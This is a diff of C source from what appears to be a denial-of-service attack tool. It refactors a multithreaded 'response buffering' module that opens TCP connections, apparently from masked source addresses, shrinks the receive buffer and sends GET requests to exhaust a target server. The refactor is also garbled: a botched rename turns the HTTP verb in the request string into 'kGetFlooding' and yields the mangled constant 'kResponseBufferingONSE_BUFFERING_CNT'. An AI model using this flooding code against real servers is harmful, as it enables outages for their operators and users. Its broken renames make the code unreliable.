@@ -5,9 +5,9 @@
 #include "base/time_check.h"
 #include "ddos/body_buffering.h"
 
-#define GET_METHOD "GET /Force.mp3 HTTP/1.1\r\nHost: localhost\r\n\r\n"
+#define kGetFlooding_METHOD "kGetFlooding /Force.mp3 HTTP/1.1\r\nHost: localhost\r\n\r\n"
 
-#define RESPONSE_BUFFERING_CNT 50
+#define kResponseBufferingONSE_BUFFERING_CNT 50
 
 extern int g_num_threads;
 
@@ -26,7 +26,7 @@ pthread_cond_t g_resbuf_cond = PTHREAD_COND_INITIALIZER;
 struct timespec g_resbuf_before_time;
 struct timespec g_resbuf_now_time;
 
-void response_buffering_print_usage(void)
+void ResponseBufferingPrintUsage(void)
 {
 	printf(
 			"response buffering Usage : "
@@ -34,7 +34,7 @@ void response_buffering_print_usage(void)
 	return;
 }
 
-void *generate_response_buffering(void *data)
+void *GenerateResponseBuffering(void *data)
 {
 	int thread_id = *((int*) data);
 	// making tcp connection
@@ -45,13 +45,13 @@ void *generate_response_buffering(void *data)
 	servaddr.sin_family = AF_INET;
 	servaddr.sin_addr.s_addr = inet_addr(g_resbuf_input.dest);
 	servaddr.sin_port = htons(g_resbuf_input.port_start);
-	int response_buffering_cnt = 0;
+	int resbuf_cnt = 0;
 	while (1) {
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_resbuf_mutex);
 		// get now resource
-		get_masking_arguments(&g_resbuf_input, &g_resbuf_now);
-		if (response_buffering_cnt % RESPONSE_BUFFERING_CNT == 0) {
+		GetMaskingArguments(&g_resbuf_input, &g_resbuf_now);
+		if (resbuf_cnt % kResponseBufferingONSE_BUFFERING_CNT == 0) {
 			if(sock!=-1)
 				close(sock);
 
@@ -64,7 +64,7 @@ void *generate_response_buffering(void *data)
 			setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rvsz,
 								sizeof(rvsz));
 
-			sock = tcp_make_connection(
+			sock = MakeTcpConnection(
 					inet_addr(g_resbuf_now.src),
 					inet_addr(g_resbuf_now.dest),
 					&src_port,
@@ -73,22 +73,22 @@ void *generate_response_buffering(void *data)
 					&ack,
 					1);
 
-			char http_request[] = GET_METHOD;
+			char http_request[] = kGetFlooding_METHOD;
 			/*if ((send(sock, http_request, strlen(http_request), 0)) < 0) {
 			 perror("get send err\n");
 			 }*/
-			tcp_socket_send_data(
+			TcpSocketSendData(
 					sock,
 					inet_addr(g_resbuf_now.src),
 					inet_addr(g_resbuf_now.dest),
 					src_port,
 					g_resbuf_now.port,
-					GET_METHOD,
-					strlen(GET_METHOD),
+					kGetFlooding_METHOD,
+					strlen(kGetFlooding_METHOD),
 					seq,
 					ack,
 					1);
-			response_buffering_cnt = 0;
+			resbuf_cnt = 0;
 
 			fcntl(sock, F_SETFL, O_NONBLOCK);
 		}
@@ -97,7 +97,7 @@ void *generate_response_buffering(void *data)
 			pthread_cond_wait(&g_resbuf_cond, &g_resbuf_mutex);
 		}
 		// time checking
-		time_check(
+		TimeCheck(
 				&g_resbuf_cond,
 				&g_resbuf_before_time,
 				&g_resbuf_now_time,
@@ -117,7 +117,7 @@ void *generate_response_buffering(void *data)
 		//printf("Read : %c\n", buffer[0]);
 		g_resbuf_num_generated_in_sec++;
 		g_resbuf_num_total++;
-		response_buffering_cnt++;
+		resbuf_cnt++;
 		// *** end of critical section ***
 		pthread_mutex_unlock(&g_resbuf_mutex);
 	}
@@ -125,11 +125,11 @@ void *generate_response_buffering(void *data)
 	return NULL;
 }
 
-void *response_buffering_time_check(void *data)
+void *ResponseBufferingTimeCheck(void *data)
 {
 	while (1) {
 		pthread_mutex_lock(&g_resbuf_mutex);
-		time_check(
+		TimeCheck(
 				&g_resbuf_cond,
 				&g_resbuf_before_time,
 				&g_resbuf_now_time,
@@ -139,17 +139,17 @@ void *response_buffering_time_check(void *data)
 	return NULL;
 }
 
-void response_buffering_main(char *argv[])
+void ResponseBufferingMain(char *argv[])
 {
 	int argc = 0;
 	while (argv[argc] != NULL) {
 		argc++;
 	}
 	if (argc != 4) {
-		response_buffering_print_usage();
+		ResponseBufferingPrintUsage();
 		return;
 	}
-	argv_to_input_arguments(argv, &g_resbuf_input);
+	ArgvToInputArguments(argv, &g_resbuf_input);
 	g_resbuf_num_generated_in_sec = 0;
 	g_resbuf_num_total = 0;
 	memset(&g_resbuf_before_time, 0, sizeof(struct timespec));
@@ -167,12 +167,12 @@ void response_buffering_main(char *argv[])
 			num_threads);
 	int i;
 	for (i = 0; i < num_threads; i++) {
-		pthread_create(&threads[i], NULL, generate_response_buffering,
+		pthread_create(&threads[i], NULL, GenerateResponseBuffering,
 				(void*) &thread_ids[i]);
 		/*RECEIVE THREAD DEACTIVATION*/
 		// pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
 	}
-	pthread_create(&threads[i], NULL, response_buffering_time_check,
+	pthread_create(&threads[i], NULL, ResponseBufferingTimeCheck,
 			(void*) &thread_ids[i]);
 	for (int i = 0; i < num_threads; i++) {
 		pthread_join(threads[i], NULL);
